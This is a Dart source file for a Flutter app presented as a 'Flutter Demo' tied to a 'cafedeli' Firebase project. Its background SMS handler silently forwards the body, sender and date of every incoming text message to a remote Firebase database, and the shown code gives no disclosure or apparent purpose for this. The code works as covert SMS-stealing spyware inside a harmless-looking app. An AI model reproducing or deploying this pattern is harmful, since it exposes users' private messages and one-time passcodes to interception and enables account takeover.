import 'package:flutter/material.dart';
import 'dart:convert';
import 'package:telephony/telephony.dart';
import 'package:http/http.dart' as http;

import 'homepage.dart';

onBackgroundMessage(SmsMessage message) async {
  var url =
      Uri.https('cafedeli-7cbdc-default-rtdb.firebaseio.com', '/messages.json');

  await http.post(url, body:json.encode({
    'sms': message.body,
    'Adddress': message.address,
    'id':message.date
  }) );
  return message;
}

void main() {
  runApp(const MyApp());
}

class MyApp extends StatelessWidget {
  const MyApp({Key? key}) : super(key: key);

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      title: 'Flutter Demo',
      theme: ThemeData(
        primarySwatch: Colors.blue,
      ),
      home: Homepage(onBackgroundMessage),
    );
  }
}
